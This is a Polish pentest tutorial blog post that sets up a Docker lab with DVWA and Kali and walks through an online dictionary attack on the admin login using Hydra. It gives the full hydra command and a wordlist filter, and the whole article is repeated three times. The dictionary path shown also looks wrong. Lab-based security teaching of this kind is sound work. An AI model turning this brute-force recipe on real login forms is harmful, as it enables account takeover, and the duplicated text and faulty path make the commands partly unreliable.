Do tej pory, wiedza na temat obsługi narzędzi wykorzystywanych przez pentesterów (i internetowych włamywaczy), była przez nas przekazywana głównie na szkoleniach. Jeśli chcecie zobaczyć na czym dokładnie one polegają, tutaj znajdziecie niezły opis. Postanowiliśmy nieco to zmienić. Dziś rozpoczynamy publikację video poradników pt. Niebezpieczny Poradnik Pentestera, które mają na celu zaznajomienie Was z narzędziami, jakich możecie użyć do testowania bezpieczeństwa własnych stron internetowych. Każdy z naszych filmików uzupełniony będzie artykułem, prezentującym jak krok po kroku wygląda omawiana metoda działania. Na pierwszy ogień idzie jeden z popularniejszych tematów, czyli łamanie haseł do konta z użyciem metody słownikowej (online). Oto pierwszy odcinek naszego poradnika (poniżej prezentujemy dodatkowy tekstowy opis do tego odcinka). Potrzebujesz testowego VPS? Ten daje 2 miesiące darmowych testów Wszystkie nasze poradniki realizowane są na serwerach VPS firmy DigitalOcean z wykorzystaniem rozwiązania jakim jest Docker. Digital Ocean umożliwia szybkie tworzenie VPS-ów z dyskami SSD na szybkich łączach i co ważne — rozlicza je za sekundę pracy. Co więcej, jeśli konto założycie z tego linka, dostaniecie na start 10 dolarów (czyli ok. 2 miesiące pracy serwera za darmo). Dlatego właśnie ten dostawca idealnie nadaje się na “testowe maszynki”. Te same efekty możesz oczywiście osiągnąć konfigurując testowego laba na własnym komputerze. Konfiguracja laba Aplikacji z panelami logowania jest w sieci wiele, ale aby nasze testy były w pełni legalne, postawimy na swoim serwerze dedykowany kontener z celowo “dziurawą” aplikacją i to ją będziemy atakować. Najpierw stwórz swojego VPS-a (Digital Ocean nazywa je Dropletami), wybierając tę opcję: Nasz serwer testowy został zainstalowany z użyciem obrazu o nazwie Docker 17.05.0-ce on 16.04. Jest to najnowsza wersja Ubuntu z zainstalowanym już oprogramowaniem, które będzie nam potrzebne. Znajdziesz ją w zakładce “One-click apps”. Po zalogowaniu się na serwer, ściągamy obraz z “Damn Vulnerable Web App“, czyli aplikacją, która celowo została napisana w taki sposób, aby zawierała wiele podatności i można było ją zaatakować na dziesiątki różnych sposobów. Wydajemy polecenie: docker pull citizenstig/dvwa Gdy ściąganie obrazu dobiegnie końca, musimy uruchomić nowy kontener z obrazem systemu z DVWA. docker run -d -p 80:80 citizenstig/dvwa Parametr “-p 80:80” sprawi, że prywatny port numer 80 (domyślnie działa tam serwer WWW) zostanie udostępniony jako port 80 naszej głównej maszyny. Dzięki temu, będziemy mogli podglądać atakowaną aplikację spoza środowiska Dockera. Przygotujmy system operacyjny pentestera Mamy już gotowy system ofiary, teraz musimy przygotować sobie system na którym będziemy pracować. Posłużymy się tutaj Kali Linuksem. Ściągamy jego obraz: docker pull kalilinux/kali-linux-docker UWAGA! Obraz o nazwie kali-linux-docker to nie jest ten sam system, który znasz z wydania na DVD/ISO. Jest to wersja podstawowa, minimalistyczna, która domyślnie nie zawiera żadnego oprogramowania do atakowania serwerów czy aplikacji. Wszystko czego potrzebujemy, będziemy doinstalować osobno. Uruchamiamy Kali Linuksa: docker run -t -i kalilinux/kali-linux-docker /bin/bash Wychodzimy z systemu, bez wyłączania Dockera. Robimy to za pomocą kombinacji klawiszy CTRL+P, CTRL+Q. Zbudujmy dedykowaną podsieć dla kontenerów ofiary i pentestera Aby połączyć nasze nowe kontenery w jedną sieć, zakładamy sieć testową (LAB to nazwa naszej sieci — możesz ją zmienić na dowolną): docker network create lab Podłączamy dwa kontenery do utworzonej wyżej sieci: docker network connect lab 123456789 W miejsce 123456789 wpisujemy numer ID pierwszego (dvwa), później drugiego (kali) z kontenerów. Jeśli wszystko poszło dobrze, możemy ponownie wrócić do Kali Linuxa: docker attach KALI_ID W miejsce KALI_ID podaj ID kontenera, które znajdziesz w wyjściu polecenia “docker ps” (pierwsza kolumna). Uzbrajanie Kali Linux Zacznijmy od pobrania najświeższej listy pakietów z repozytorium Kaliego: apt-get update Teraz musimy doinstalować oprogramowanie do łamania haseł — w naszym przypadku będzie to Hydra. apt-get install hydra Potrzebujemy słownika! Będzie nam jeszcze potrzebny słownik z hasłami. Takich słowników, zawierających hasła pochodzące z wycieków ze znanych serwisów internetowych jest w sieci wiele. My jednak posłużymy się tutaj standardowym słownikiem języka angielskiego, dostępnym w Ubuntu, aby przy okazji pokazać Wam, jak można przykładowo przefiltrować zawartość słownika. Instalujemy go za pomocą polecenia: apt-get install wamerican Słownik ten zawiera ponad 100 000 haseł. Aby przyspieszyć atak i ograniczyć go do słów mających od 6 do 8 znaków z zakresu A-Z, wydajemy polecenie: grep -E '^[a-z]{6,8}$' /usr/shared/dict/wamerican >./maly-slownik.txt W ten sposób, utworzyliśmy plik “maly-slownik.txt” (w lokalnym katalogu), zawierający niespełna 27 tysięcy haseł. Właściwa część ataku Uruchamiamy Hydrę poleceniem: hydra ID_DVWA http-form-post "/login.php:Login=Login&username=^USER^&password=^PASS^:failed" -l admin -P ./maly-slownik.txt -t 64 pod ID_DVWA podstaw oznaczenie ID kontenera z podatną aplikacją (pierwsza kolumna z “docker ps“). Wyjaśnienie parametrów: /login.php – nazwa pliku z panelem logowania Login=Login&username=^USER^&password=^PASS^ – zdefiniowanie pól wysyłanych przez formularz (zobacz film!) failed – fragment komunikatu, jaki pojawia się w przeglądarce, gdy hasło jest niepoprawne -l admin – łam hasło jedynie dla użytkownika “admin” -P ./maly-slownik.txt – wczytuj listę haseł z podanego pliku -t 64 – uruchom 64 wątki łamacza haseł (maksymalna wartość, odrobinę za duża dla tak małego VPSa) Po około 7-8 minutach, hasło do DVWA powinno zostać złamane. Programów do łamania haseł “online” jest więcej — całkiem niezły jest też ncrack. Przed takimi atakami “próbowania haseł” można się też zabezpieczyć od strony aplikacji na kilka sposobów. Ale to temat na kolejny odcinek… Podsumowanie Nasze “poradniki pentestera” mają pokazywać jak pentesterzy lub po prostu programiści czy administratorzy systemów, mogą samodzielnie przetestować swoje środowisko pod kątem popularnych ataków. W tym odcinku zaprezentowaliśmy Wam jeden z najpopularniejszych i najprostszych zarazem ataków na aplikacje webowe — “zgadywanie haseł”. Przypomnijmy, że ostatnio dokładnie tego typu atak okazał się zaskakująco skuteczny i wywołał sporo problemów dla użytkowników Wykopu. Pamiętaj, że obchodzenie jakichkolwiek zabezpieczeń na serwerach, które nie należą do Ciebie, jest karalne Do zobaczenia w kolejnym poradniku! Albo na którymś z naszych szkoleń. Jeśli ta tematyka Cię interesuje, to najbliższe szkolenie z bezpieczeństwa webaplikacji (atak i ochrona) odbędzie się w Warszawie 13-14 lipca. Jeśli zdążycie się zarejestrować w ciągu kilku najbliższych dni, uda się Wam załapać jeszcze na niższą cenę. Szczegóły i opinie dotyczące tego szkolenia znajdziecie w tym poście. PS. Jeśli macie pomysł na kolejny odcinek, niezależnie od tego czy miałby to być opis jakiejś techniki ataku, czy zaprezentowanie sposobu konfiguracji jakiegoś narzędzie, to dajcie nam znać na adres: poradnik@niebezpiecznik.pl. Choć najbliższe odcinki mamy już rozpisane, to postaramy się wziąć pod uwagę Wasze sugestie. ,Jakub MrugalskiDo tej pory, wiedza na temat obsługi narzędzi wykorzystywanych przez pentesterów (i internetowych włamywaczy), była przez nas przekazywana głównie na szkoleniach. Jeśli chcecie zobaczyć na czym dokładnie one polegają, tutaj znajdziecie niezły opis. Postanowiliśmy nieco to zmienić. Dziś rozpoczynamy publikację video poradników pt. Niebezpieczny Poradnik Pentestera, które mają na celu zaznajomienie Was z narzędziami, jakich możecie użyć do testowania bezpieczeństwa własnych stron internetowych. Każdy z naszych filmików uzupełniony będzie artykułem, prezentującym jak krok po kroku wygląda omawiana metoda działania. Na pierwszy ogień idzie jeden z popularniejszych tematów, czyli łamanie haseł do konta z użyciem metody słownikowej (online). Oto pierwszy odcinek naszego poradnika (poniżej prezentujemy dodatkowy tekstowy opis do tego odcinka). Potrzebujesz testowego VPS? Ten daje 2 miesiące darmowych testów Wszystkie nasze poradniki realizowane są na serwerach VPS firmy DigitalOcean z wykorzystaniem rozwiązania jakim jest Docker. Digital Ocean umożliwia szybkie tworzenie VPS-ów z dyskami SSD na szybkich łączach i co ważne — rozlicza je za sekundę pracy. Co więcej, jeśli konto założycie z tego linka, dostaniecie na start 10 dolarów (czyli ok. 2 miesiące pracy serwera za darmo). Dlatego właśnie ten dostawca idealnie nadaje się na “testowe maszynki”. Te same efekty możesz oczywiście osiągnąć konfigurując testowego laba na własnym komputerze. Konfiguracja laba Aplikacji z panelami logowania jest w sieci wiele, ale aby nasze testy były w pełni legalne, postawimy na swoim serwerze dedykowany kontener z celowo “dziurawą” aplikacją i to ją będziemy atakować. Najpierw stwórz swojego VPS-a (Digital Ocean nazywa je Dropletami), wybierając tę opcję: Nasz serwer testowy został zainstalowany z użyciem obrazu o nazwie Docker 17.05.0-ce on 16.04. Jest to najnowsza wersja Ubuntu z zainstalowanym już oprogramowaniem, które będzie nam potrzebne. Znajdziesz ją w zakładce “One-click apps”. Po zalogowaniu się na serwer, ściągamy obraz z “Damn Vulnerable Web App“, czyli aplikacją, która celowo została napisana w taki sposób, aby zawierała wiele podatności i można było ją zaatakować na dziesiątki różnych sposobów. Wydajemy polecenie: docker pull citizenstig/dvwa Gdy ściąganie obrazu dobiegnie końca, musimy uruchomić nowy kontener z obrazem systemu z DVWA. docker run -d -p 80:80 citizenstig/dvwa Parametr “-p 80:80” sprawi, że prywatny port numer 80 (domyślnie działa tam serwer WWW) zostanie udostępniony jako port 80 naszej głównej maszyny. Dzięki temu, będziemy mogli podglądać atakowaną aplikację spoza środowiska Dockera. Przygotujmy system operacyjny pentestera Mamy już gotowy system ofiary, teraz musimy przygotować sobie system na którym będziemy pracować. Posłużymy się tutaj Kali Linuksem. Ściągamy jego obraz: docker pull kalilinux/kali-linux-docker UWAGA! Obraz o nazwie kali-linux-docker to nie jest ten sam system, który znasz z wydania na DVD/ISO. Jest to wersja podstawowa, minimalistyczna, która domyślnie nie zawiera żadnego oprogramowania do atakowania serwerów czy aplikacji. Wszystko czego potrzebujemy, będziemy doinstalować osobno. Uruchamiamy Kali Linuksa: docker run -t -i kalilinux/kali-linux-docker /bin/bash Wychodzimy z systemu, bez wyłączania Dockera. Robimy to za pomocą kombinacji klawiszy CTRL+P, CTRL+Q. Zbudujmy dedykowaną podsieć dla kontenerów ofiary i pentestera Aby połączyć nasze nowe kontenery w jedną sieć, zakładamy sieć testową (LAB to nazwa naszej sieci — możesz ją zmienić na dowolną): docker network create lab Podłączamy dwa kontenery do utworzonej wyżej sieci: docker network connect lab 123456789 W miejsce 123456789 wpisujemy numer ID pierwszego (dvwa), później drugiego (kali) z kontenerów. Jeśli wszystko poszło dobrze, możemy ponownie wrócić do Kali Linuxa: docker attach KALI_ID W miejsce KALI_ID podaj ID kontenera, które znajdziesz w wyjściu polecenia “docker ps” (pierwsza kolumna). Uzbrajanie Kali Linux Zacznijmy od pobrania najświeższej listy pakietów z repozytorium Kaliego: apt-get update Teraz musimy doinstalować oprogramowanie do łamania haseł — w naszym przypadku będzie to Hydra. apt-get install hydra Potrzebujemy słownika! Będzie nam jeszcze potrzebny słownik z hasłami. Takich słowników, zawierających hasła pochodzące z wycieków ze znanych serwisów internetowych jest w sieci wiele. My jednak posłużymy się tutaj standardowym słownikiem języka angielskiego, dostępnym w Ubuntu, aby przy okazji pokazać Wam, jak można przykładowo przefiltrować zawartość słownika. Instalujemy go za pomocą polecenia: apt-get install wamerican Słownik ten zawiera ponad 100 000 haseł. Aby przyspieszyć atak i ograniczyć go do słów mających od 6 do 8 znaków z zakresu A-Z, wydajemy polecenie: grep -E '^[a-z]{6,8}$' /usr/shared/dict/wamerican >./maly-slownik.txt W ten sposób, utworzyliśmy plik “maly-slownik.txt” (w lokalnym katalogu), zawierający niespełna 27 tysięcy haseł. Właściwa część ataku Uruchamiamy Hydrę poleceniem: hydra ID_DVWA http-form-post "/login.php:Login=Login&username=^USER^&password=^PASS^:failed" -l admin -P ./maly-slownik.txt -t 64 pod ID_DVWA podstaw oznaczenie ID kontenera z podatną aplikacją (pierwsza kolumna z “docker ps“). Wyjaśnienie parametrów: /login.php – nazwa pliku z panelem logowania Login=Login&username=^USER^&password=^PASS^ – zdefiniowanie pól wysyłanych przez formularz (zobacz film!) failed – fragment komunikatu, jaki pojawia się w przeglądarce, gdy hasło jest niepoprawne -l admin – łam hasło jedynie dla użytkownika “admin” -P ./maly-slownik.txt – wczytuj listę haseł z podanego pliku -t 64 – uruchom 64 wątki łamacza haseł (maksymalna wartość, odrobinę za duża dla tak małego VPSa) Po około 7-8 minutach, hasło do DVWA powinno zostać złamane. Programów do łamania haseł “online” jest więcej — całkiem niezły jest też ncrack. Przed takimi atakami “próbowania haseł” można się też zabezpieczyć od strony aplikacji na kilka sposobów. Ale to temat na kolejny odcinek… Podsumowanie Nasze “poradniki pentestera” mają pokazywać jak pentesterzy lub po prostu programiści czy administratorzy systemów, mogą samodzielnie przetestować swoje środowisko pod kątem popularnych ataków. W tym odcinku zaprezentowaliśmy Wam jeden z najpopularniejszych i najprostszych zarazem ataków na aplikacje webowe — “zgadywanie haseł”. Przypomnijmy, że ostatnio dokładnie tego typu atak okazał się zaskakująco skuteczny i wywołał sporo problemów dla użytkowników Wykopu. Pamiętaj, że obchodzenie jakichkolwiek zabezpieczeń na serwerach, które nie należą do Ciebie, jest karalne Do zobaczenia w kolejnym poradniku! Albo na którymś z naszych szkoleń. Jeśli ta tematyka Cię interesuje, to najbliższe szkolenie z bezpieczeństwa webaplikacji (atak i ochrona) odbędzie się w Warszawie 13-14 lipca. Jeśli zdążycie się zarejestrować w ciągu kilku najbliższych dni, uda się Wam załapać jeszcze na niższą cenę. Szczegóły i opinie dotyczące tego szkolenia znajdziecie w tym poście. PS. Jeśli macie pomysł na kolejny odcinek, niezależnie od tego czy miałby to być opis jakiejś techniki ataku, czy zaprezentowanie sposobu konfiguracji jakiegoś narzędzie, to dajcie nam znać na adres: poradnik@niebezpiecznik.pl. Choć najbliższe odcinki mamy już rozpisane, to postaramy się wziąć pod uwagę Wasze sugestie. ,Jakub MrugalskiDo tej pory, wiedza na temat obsługi narzędzi wykorzystywanych przez pentesterów (i internetowych włamywaczy), była przez nas przekazywana głównie na szkoleniach. Jeśli chcecie zobaczyć na czym dokładnie one polegają, tutaj znajdziecie niezły opis. Postanowiliśmy nieco to zmienić. Dziś rozpoczynamy publikację video poradników pt. Niebezpieczny Poradnik Pentestera, które mają na celu zaznajomienie Was z narzędziami, jakich możecie użyć do testowania bezpieczeństwa własnych stron internetowych. Każdy z naszych filmików uzupełniony będzie artykułem, prezentującym jak krok po kroku wygląda omawiana metoda działania. Na pierwszy ogień idzie jeden z popularniejszych tematów, czyli łamanie haseł do konta z użyciem metody słownikowej (online). Oto pierwszy odcinek naszego poradnika (poniżej prezentujemy dodatkowy tekstowy opis do tego odcinka). Potrzebujesz testowego VPS? Ten daje 2 miesiące darmowych testów Wszystkie nasze poradniki realizowane są na serwerach VPS firmy DigitalOcean z wykorzystaniem rozwiązania jakim jest Docker. Digital Ocean umożliwia szybkie tworzenie VPS-ów z dyskami SSD na szybkich łączach i co ważne — rozlicza je za sekundę pracy. Co więcej, jeśli konto założycie z tego linka, dostaniecie na start 10 dolarów (czyli ok. 2 miesiące pracy serwera za darmo). Dlatego właśnie ten dostawca idealnie nadaje się na “testowe maszynki”. Te same efekty możesz oczywiście osiągnąć konfigurując testowego laba na własnym komputerze. Konfiguracja laba Aplikacji z panelami logowania jest w sieci wiele, ale aby nasze testy były w pełni legalne, postawimy na swoim serwerze dedykowany kontener z celowo “dziurawą” aplikacją i to ją będziemy atakować. Najpierw stwórz swojego VPS-a (Digital Ocean nazywa je Dropletami), wybierając tę opcję: Nasz serwer testowy został zainstalowany z użyciem obrazu o nazwie Docker 17.05.0-ce on 16.04. Jest to najnowsza wersja Ubuntu z zainstalowanym już oprogramowaniem, które będzie nam potrzebne. Znajdziesz ją w zakładce “One-click apps”. Po zalogowaniu się na serwer, ściągamy obraz z “Damn Vulnerable Web App“, czyli aplikacją, która celowo została napisana w taki sposób, aby zawierała wiele podatności i można było ją zaatakować na dziesiątki różnych sposobów. Wydajemy polecenie: docker pull citizenstig/dvwa Gdy ściąganie obrazu dobiegnie końca, musimy uruchomić nowy kontener z obrazem systemu z DVWA. docker run -d -p 80:80 citizenstig/dvwa Parametr “-p 80:80” sprawi, że prywatny port numer 80 (domyślnie działa tam serwer WWW) zostanie udostępniony jako port 80 naszej głównej maszyny. Dzięki temu, będziemy mogli podglądać atakowaną aplikację spoza środowiska Dockera. Przygotujmy system operacyjny pentestera Mamy już gotowy system ofiary, teraz musimy przygotować sobie system na którym będziemy pracować. Posłużymy się tutaj Kali Linuksem. Ściągamy jego obraz: docker pull kalilinux/kali-linux-docker UWAGA! Obraz o nazwie kali-linux-docker to nie jest ten sam system, który znasz z wydania na DVD/ISO. Jest to wersja podstawowa, minimalistyczna, która domyślnie nie zawiera żadnego oprogramowania do atakowania serwerów czy aplikacji. Wszystko czego potrzebujemy, będziemy doinstalować osobno. Uruchamiamy Kali Linuksa: docker run -t -i kalilinux/kali-linux-docker /bin/bash Wychodzimy z systemu, bez wyłączania Dockera. Robimy to za pomocą kombinacji klawiszy CTRL+P, CTRL+Q. Zbudujmy dedykowaną podsieć dla kontenerów ofiary i pentestera Aby połączyć nasze nowe kontenery w jedną sieć, zakładamy sieć testową (LAB to nazwa naszej sieci — możesz ją zmienić na dowolną): docker network create lab Podłączamy dwa kontenery do utworzonej wyżej sieci: docker network connect lab 123456789 W miejsce 123456789 wpisujemy numer ID pierwszego (dvwa), później drugiego (kali) z kontenerów. Jeśli wszystko poszło dobrze, możemy ponownie wrócić do Kali Linuxa: docker attach KALI_ID W miejsce KALI_ID podaj ID kontenera, które znajdziesz w wyjściu polecenia “docker ps” (pierwsza kolumna). Uzbrajanie Kali Linux Zacznijmy od pobrania najświeższej listy pakietów z repozytorium Kaliego: apt-get update Teraz musimy doinstalować oprogramowanie do łamania haseł — w naszym przypadku będzie to Hydra. apt-get install hydra Potrzebujemy słownika! Będzie nam jeszcze potrzebny słownik z hasłami. Takich słowników, zawierających hasła pochodzące z wycieków ze znanych serwisów internetowych jest w sieci wiele. My jednak posłużymy się tutaj standardowym słownikiem języka angielskiego, dostępnym w Ubuntu, aby przy okazji pokazać Wam, jak można przykładowo przefiltrować zawartość słownika. Instalujemy go za pomocą polecenia: apt-get install wamerican Słownik ten zawiera ponad 100 000 haseł. Aby przyspieszyć atak i ograniczyć go do słów mających od 6 do 8 znaków z zakresu A-Z, wydajemy polecenie: grep -E '^[a-z]{6,8}$' /usr/shared/dict/wamerican >./maly-slownik.txt W ten sposób, utworzyliśmy plik “maly-slownik.txt” (w lokalnym katalogu), zawierający niespełna 27 tysięcy haseł. Właściwa część ataku Uruchamiamy Hydrę poleceniem: hydra ID_DVWA http-form-post "/login.php:Login=Login&username=^USER^&password=^PASS^:failed" -l admin -P ./maly-slownik.txt -t 64 pod ID_DVWA podstaw oznaczenie ID kontenera z podatną aplikacją (pierwsza kolumna z “docker ps“). Wyjaśnienie parametrów: /login.php – nazwa pliku z panelem logowania Login=Login&username=^USER^&password=^PASS^ – zdefiniowanie pól wysyłanych przez formularz (zobacz film!) failed – fragment komunikatu, jaki pojawia się w przeglądarce, gdy hasło jest niepoprawne -l admin – łam hasło jedynie dla użytkownika “admin” -P ./maly-slownik.txt – wczytuj listę haseł z podanego pliku -t 64 – uruchom 64 wątki łamacza haseł (maksymalna wartość, odrobinę za duża dla tak małego VPSa) Po około 7-8 minutach, hasło do DVWA powinno zostać złamane. Programów do łamania haseł “online” jest więcej — całkiem niezły jest też ncrack. Przed takimi atakami “próbowania haseł” można się też zabezpieczyć od strony aplikacji na kilka sposobów. Ale to temat na kolejny odcinek… Podsumowanie Nasze “poradniki pentestera” mają pokazywać jak pentesterzy lub po prostu programiści czy administratorzy systemów, mogą samodzielnie przetestować swoje środowisko pod kątem popularnych ataków. W tym odcinku zaprezentowaliśmy Wam jeden z najpopularniejszych i najprostszych zarazem ataków na aplikacje webowe — “zgadywanie haseł”. Przypomnijmy, że ostatnio dokładnie tego typu atak okazał się zaskakująco skuteczny i wywołał sporo problemów dla użytkowników Wykopu. Pamiętaj, że obchodzenie jakichkolwiek zabezpieczeń na serwerach, które nie należą do Ciebie, jest karalne Do zobaczenia w kolejnym poradniku! Albo na którymś z naszych szkoleń. Jeśli ta tematyka Cię interesuje, to najbliższe szkolenie z bezpieczeństwa webaplikacji (atak i ochrona) odbędzie się w Warszawie 13-14 lipca. Jeśli zdążycie się zarejestrować w ciągu kilku najbliższych dni, uda się Wam załapać jeszcze na niższą cenę. Szczegóły i opinie dotyczące tego szkolenia znajdziecie w tym poście. PS. Jeśli macie pomysł na kolejny odcinek, niezależnie od tego czy miałby to być opis jakiejś techniki ataku, czy zaprezentowanie sposobu konfiguracji jakiegoś narzędzie, to dajcie nam znać na adres: poradnik@niebezpiecznik.pl. Choć najbliższe odcinki mamy już rozpisane, to postaramy się wziąć pod uwagę Wasze sugestie. ,Jakub Mrugalski